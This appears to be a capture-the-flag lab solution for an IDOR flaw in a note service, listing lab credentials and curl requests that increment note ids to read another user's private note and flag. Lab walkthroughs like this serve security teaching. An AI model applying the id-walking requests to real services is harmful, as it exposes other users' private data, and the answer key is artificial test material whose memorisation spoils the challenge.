# IDOR — NumericId · Notekeep (difficulty: low)

Notekeep serves notes at `GET /api/notes/{id}` (JSON) and `GET /notes/{id}` (view page). Both require a login but **never check that the note belongs to the session user**, and ids are sequential integers — any authenticated user can walk the table id by id. The innocent user's seeded private note (titled "private — do not share") contains the flag.

Intended path:
1. Log in at http://victim.target.lab:8119/ as `0xnhsec` / `vlh-tester-01` — your dashboard lists your own notes (ids 1–2).
2. Increment the id beyond your own notes: `curl -si -b "sid=<sid>" http://victim.target.lab:8119/api/notes/3` (a teammate's note — already proof of the bug), then keep going.
3. `curl -s -b "sid=<sid>" http://victim.target.lab:8119/api/notes/5` → the innocent's note; its `body` is the flag.
4. (Browser equivalent: the "open a note by id" form on the dashboard.)

Flag: `DSLTV{IDOR-NumericId-<9-10 digits>}` (resource-resident — regenerated every restart; changing the innocent's note in a later session does not move it).
